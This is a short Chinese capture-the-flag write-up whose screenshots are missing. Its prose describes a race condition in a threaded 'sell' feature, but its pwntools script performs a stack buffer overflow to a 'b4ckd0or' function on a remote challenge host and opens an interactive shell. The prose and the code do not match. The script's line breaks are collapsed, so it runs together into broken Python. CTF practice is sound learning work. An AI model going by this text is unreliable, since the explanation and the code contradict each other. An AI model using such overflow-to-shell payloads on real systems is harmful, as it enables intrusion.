我们这一题，首先拿到我们的一个程序如下所示：
![[Pasted image 20240131160745.png]]

![[Pasted image 20240131160752.png]]


![[Pasted image 20240131160800.png]]

![[Pasted image 20240131160808.png]]

我们发现，我们需要的 flag 文件，已经被我们放到了我们的 look 函数当中，只要我们能够执行我们的 look 函数，那么我们就一定能得到我们的 flag。

于是，我们观察到我们的售卖功能实际上是使用了一个 `pthread_create` 函数，这一类函数是存在时间间隔的，因此，只要我们的指令发送的足够快，那么我们就可以卖出两次。我们就可以得到我们的结果。

```python
# coding=utf-8 
from pwn import * context(log_level='debug',arch='amd64', os='linux') pwnfile= './vuln' 
# io = process(pwnfile)
io = remote('1.14.71.254', 28804) elf = ELF(pwnfile) padding = 0x18 ret = 0x40101a fun_addr = elf.sym['b4ckd0or'] payload = flat([b'a'* padding , ret,fun_addr]) io.sendline(payload) io.sendline("exec 1>&0\n") #把输出重定向 io.interactive()
```